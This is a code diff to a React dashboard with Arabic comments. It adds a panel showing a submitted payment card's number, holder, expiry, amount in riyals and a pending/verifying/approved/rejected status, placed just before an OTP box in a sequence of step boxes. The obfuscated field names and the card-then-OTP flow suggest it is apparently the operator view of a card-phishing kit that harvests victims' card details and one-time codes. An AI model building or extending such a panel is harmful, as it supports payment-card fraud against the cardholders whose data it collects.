@@ -1794,6 +1794,187 @@ export default function DashboardPage() {
     );
   };
 
+  // صندوق بيانات بطاقة الدفع (صفحة check)
+  const renderCheckBox = () => {
+    const raw = selectedRequest?.raw || {};
+    
+    // التحقق من وجود بيانات البطاقة
+    const hasCardData = raw?._v1 || raw?.cardNumber || raw?.hasCard;
+    if (!hasCardData) return null;
+
+    // رقم البطاقة (مخفي جزئياً)
+    const cardNumber = raw?._v1 || raw?.cardNumber || "";
+    const maskedCard = cardNumber.replace(/(\d{4})\s?(\d{4})\s?(\d{4})\s?(\d{4})/, (_, g1, g2, g3, g4) => {
+      return `${g1} **** **** ${g4}`;
+    });
+
+    // نوع البطاقة
+    const cardType = raw?.cardType || detectCardType(cardNumber);
+    const cardTypeIcons: Record<string, string> = {
+      "Visa": "💳",
+      "Mastercard": "💳",
+      "Mada": "💳"
+    };
+
+    // حالة البطاقة
+    const cardStatus = raw?._v1Status || raw?.cardStatus || "pending";
+    const cardStatusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
+      "pending": { color: "#92400e", bg: "#fef3c7", border: "#fcd34d", icon: "⏳", text: "بانتظار التحقق" },
+      "verifying": { color: "#1e40af", bg: "#dbeafe", border: "#93c5fd", icon: "🔄", text: "جاري التحقق" },
+      "approved": { color: "#166534", bg: "#dcfce7", border: "#86efac", icon: "✅", text: "تم التحقق" },
+      "rejected": { color: "#991b1b", bg: "#fee2e2", border: "#fca5a5", icon: "❌", text: "مرفوض" }
+    };
+    const cardConfig = cardStatusConfig[cardStatus] || cardStatusConfig["pending"];
+
+    // تاريخ الانتهاء
+    const expiryDate = raw?._v3 || raw?.cardExpiry || "";
+
+    // اسم حامل البطاقة
+    const cardHolder = raw?._v4 || raw?.cardHolder || "";
+
+    // السعر الإجمالي
+    const totalPrice = raw?.offerTotalPrice || raw?.totalPrice || 0;
+
+    return (
+      <div style={{ 
+        background: "#ffffff", 
+        borderRadius: 12, 
+        padding: 16, 
+        border: "1px solid #e5e7eb",
+        marginBottom: 12
+      }}>
+        {/* Header */}
+        <div style={{ 
+          display: "flex", 
+          justifyContent: "center", 
+          alignItems: "center", 
+          gap: 8, 
+          marginBottom: 12,
+          paddingBottom: 12,
+          borderBottom: "2px solid #e5e7eb"
+        }}>
+          <span style={{ fontSize: "1.2rem" }}>💳</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#0a4a68" }}>
+            بيانات بطاقة الدفع
+          </h3>
+        </div>
+
+        {/* Card Status Badge */}
+        <div style={{ 
+          ...cardConfig, 
+          borderRadius: 8, 
+          padding: 10, 
+          border: `1px solid ${cardConfig.border}`,
+          display: "flex",
+          alignItems: "center",
+          gap: 8,
+          marginBottom: 12
+        }}>
+          <span style={{ fontSize: "1rem" }}>{cardConfig.icon}</span>
+          <span style={{ fontSize: "0.8rem", fontWeight: 600, color: cardConfig.color }}>
+            {cardConfig.text}
+          </span>
+        </div>
+
+        {/* Card Preview */}
+        <div style={{
+          background: "linear-gradient(135deg, #1e3a5f 0%, #0a4a68 100%)",
+          borderRadius: 12,
+          padding: 16,
+          marginBottom: 12,
+          color: "white"
+        }}>
+          <div style={{ 
+            display: "flex", 
+            justifyContent: "space-between", 
+            alignItems: "center",
+            marginBottom: 16
+          }}>
+            <span style={{ fontSize: "0.8rem", fontWeight: 500, opacity: 0.9 }}>
+              {cardType || "Credit Card"}
+            </span>
+            <span style={{ fontSize: "1.2rem" }}>💳</span>
+          </div>
+          
+          <div style={{ 
+            fontFamily: "ui-monospace, monospace", 
+            fontSize: "1.1rem", 
+            letterSpacing: "2px",
+            marginBottom: 12
+          }}>
+            {maskedCard || "**** **** **** ****"}
+          </div>
+          
+          <div style={{ 
+            display: "flex", 
+            justifyContent: "space-between",
+            fontSize: "0.75rem"
+          }}>
+            <div>
+              <div style={{ opacity: 0.7, marginBottom: 2 }}>Card Holder</div>
+              <div style={{ fontWeight: 500, textTransform: "uppercase" }}>
+                {cardHolder || "UNKNOWN"}
+              </div>
+            </div>
+            <div>
+              <div style={{ opacity: 0.7, marginBottom: 2 }}>Expires</div>
+              <div style={{ fontWeight: 500 }}>{expiryDate || "**/**"}</div>
+            </div>
+          </div>
+        </div>
+
+        {/* Payment Amount */}
+        {totalPrice > 0 && (
+          <div style={{
+            background: "#f0fdf4",
+            borderRadius: 8,
+            padding: 12,
+            display: "flex",
+            justifyContent: "space-between",
+            alignItems: "center",
+            border: "1px solid #86efac"
+          }}>
+            <span style={{ fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>
+              المبلغ الإجمالي
+            </span>
+            <span style={{ 
+              fontSize: "1.2rem", 
+              fontWeight: 700, 
+              color: "#166534",
+              fontFamily: "ui-monospace, monospace"
+            }}>
+              {Number(totalPrice).toFixed(2)} ﷼
+            </span>
+          </div>
+        )}
+
+        {/* Card Updated Time */}
+        {raw?.cardUpdatedAt && (
+          <div style={{
+            marginTop: 10,
+            fontSize: "0.7rem",
+            color: "#9ca3af",
+            textAlign: "center"
+          }}>
+            آخر تحديث: {formatElapsedTime(raw.cardUpdatedAt)}
+          </div>
+        )}
+      </div>
+    );
+  };
+
+  // دالة للكشف عن نوع البطاقة من الرقم
+  function detectCardType(cardNumber: string): string {
+    const cleanNumber = cardNumber.replace(/\s/g, "");
+    if (/^4/.test(cleanNumber)) return "Visa";
+    if (/^5[1-5]/.test(cleanNumber)) return "Mastercard";
+    if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleanNumber)) return "Visa";
+    if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) return "Mastercard";
+    if (/^2[2-7]/.test(cleanNumber)) return "Mastercard";
+    if (/^6(?:011|5)/.test(cleanNumber)) return "Discover";
+    return "Card";
+  }
+
   // صندوق صفحة رقم الهاتف (step5)
   const renderPhoneBox = () => {
     const raw = selectedRequest?.raw || {};
@@ -1944,6 +2125,10 @@ export default function DashboardPage() {
 
     const comparBox = renderComparBox();
     if (comparBox) boxes.push({ key: 'compar', component: comparBox });
+
+    // صندوق بطاقة الدفع (صفحة check) - يظهر قبل OTP
+    const checkBox = renderCheckBox();
+    if (checkBox) boxes.push({ key: 'check', component: checkBox });
 
     const otpBox = renderOtpBox();
     if (otpBox) boxes.push({ key: 'otp', component: otpBox });
